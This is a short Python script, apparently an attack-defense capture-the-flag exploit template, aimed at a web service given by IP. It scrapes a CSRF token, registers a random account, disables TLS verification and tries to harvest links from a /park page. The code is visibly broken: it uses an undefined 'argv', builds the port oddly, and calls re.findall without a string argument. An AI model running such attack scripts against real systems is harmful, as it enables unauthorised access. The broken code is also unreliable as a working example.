#!/usr/bin/python3
import requests, time, string, re, sys, os, random, base64, logging
from pathlib import Path
random.seed(time.time())

if len(sys.argv) <= 1:
    print("USAGE: " + sys.argv[0] + " <ip to attack>")
    exit(1)

### CONFIG
#### change me
exploit_name = 'http'
default_value = 0
target_port = '2' + argv[1]
#### defaults
target = sys.argv[1]
proxies = {}
if os.environ.get('proxy'):
    proxies['http'] = 'http://127.0.0.1:'+os.environ.get('proxy')
    proxies['https'] = 'http://127.0.0.1:'+os.environ.get('proxy')
###

def create_data_dir():
    Path(exploit_name).mkdir(parents=True, exist_ok=True)

def read_data(default_value):
    my_file = Path(f"{exploit_name}/{target}")
    if my_file.is_file():
        content = open(f'{exploit_name}/{target}').read()
        logging.info(f'The file for the {target} exist')
        logging.debug(f'The content of the file: {content}')
        return content
    logging.info(f'The file for the {target} do not exist')
    return default_value

def write_data(text):
    with open(f'{exploit_name}/{target}', 'w') as out:
        out.write(str(text))

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

create_data_dir()
service_url = f"http://{target}:{target_port}"
print("Attacking " + service_url + "...")
http = requests.Session()

### The xploit:

fcount = int(read_data(default_value))

reg_url = f"{service_url}/auth/register"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0", "Content-Type": "application/x-www-form-urlencoded"}
resp = http.get(reg_url, headers=burp0_headers, proxies=proxies, verify=False)
token = re.findall(r'name="__RequestVerificationToken" type="hidden" value="(.+)"', resp.text)

burp0_url = f"{service_url}/auth/register"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0", "Content-Type": "application/x-www-form-urlencoded"}
login = generate_random_string(5)
burp0_data = {"Login": login, "Document": generate_random_string(5), "Password": login,"RepeatedPassword":login, "__RequestVerificationToken": token}

response = http.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies, verify=False)

response = http.get(f"{service_url}/park").text

parks = re.findall('''<a href="(.+?)">.+?</a>''')
print(parks)